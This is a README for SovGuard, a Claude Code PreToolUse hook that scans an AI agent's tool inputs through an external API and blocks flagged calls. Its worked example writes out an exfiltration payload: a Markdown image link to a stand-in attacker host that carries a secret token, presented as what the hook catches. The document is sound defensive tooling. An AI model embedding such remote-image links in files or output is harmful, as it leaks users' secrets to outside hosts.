# SovGuard PreToolUse hook for Claude Code

A [Claude Code hook](https://docs.claude.com/en/docs/claude-code/hooks) that scans
tool inputs through [SovGuard](https://sovguard.io) **before** each tool runs. If
SovGuard flags the input as unsafe, the hook blocks the tool call and hands the
reason back to Claude.

The hook reads the [`PreToolUse`](https://docs.claude.com/en/docs/claude-code/hooks)
event JSON on stdin, extracts text from the tool input (`content`, `command`,
`prompt`, `new_string`, `query`), and POSTs it to `/v1/scan`.

## Install

The script is plain Node (>= 18, for global `fetch` / `AbortSignal.timeout`) with
no dependencies. Make it executable:

```bash
chmod +x /ABS/PATH/TO/integrations/claude-code-hook/sovguard-pretooluse.mjs
```

Add it to your `.claude/settings.json` (use the **absolute path** to the script):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "/ABS/PATH/TO/integrations/claude-code-hook/sovguard-pretooluse.mjs"
          }
        ]
      }
    ]
  }
}
```

Restrict the `matcher` (e.g. `"Write|Edit|Bash"`) if you only want to scan certain
tools.

## Environment

```bash
export SOVGUARD_API_KEY=sk-...                      # your SovGuard tenant key
export SOVGUARD_API_BASE=https://api.sovguard.io    # optional; this is the default
# export SOVGUARD_BLOCK_THRESHOLD=0.7               # optional; default 0.7
# export SOVGUARD_FAIL_CLOSED=1                      # optional; block on scan errors
```

| Variable | Default | Effect |
| --- | --- | --- |
| `SOVGUARD_API_BASE` | `https://api.sovguard.io` | Base URL of your SovGuard API. |
| `SOVGUARD_API_KEY` | *(empty)* | Tenant key sent as `X-API-Key`. |
| `SOVGUARD_BLOCK_THRESHOLD` | `0.7` | Minimum `score` (with `safe: false`) required to block. |
| `SOVGUARD_FAIL_CLOSED` | unset | See below. |

## Fail-open by default

If the scan request fails (network error, timeout, SovGuard unreachable), the hook
prints a `[sovguard] scan failed …` warning to stderr and **allows** the tool call
(exit 0). This keeps Claude Code usable when SovGuard is down. To instead **block**
on scan errors, set `SOVGUARD_FAIL_CLOSED=1` (the hook then exits `2`, which tells
Claude Code to block).

## Worked example: blocking an exfil `Write`

Suppose Claude tries to write a Markdown file whose content smuggles data out via a
remote image (a classic exfiltration payload):

```bash
echo '{"tool_input":{"content":"![leak](https://evil.example/collect?data=SECRET_TOKEN)"}}' \
  | SOVGUARD_API_KEY=$SOVGUARD_API_KEY node sovguard-pretooluse.mjs
```

SovGuard flags the remote-image exfil; with `score >= 0.7` the hook emits a block
decision on stdout:

```json
{"decision":"block","reason":"SovGuard blocked this tool call: exfiltration (score 0.9). Flags: remote_image_exfil"}
```

Claude Code sees `decision: block` and refuses to run the `Write`, showing the
`reason` so the model can course-correct. Safe inputs produce no output and exit 0,
letting the tool proceed normally.
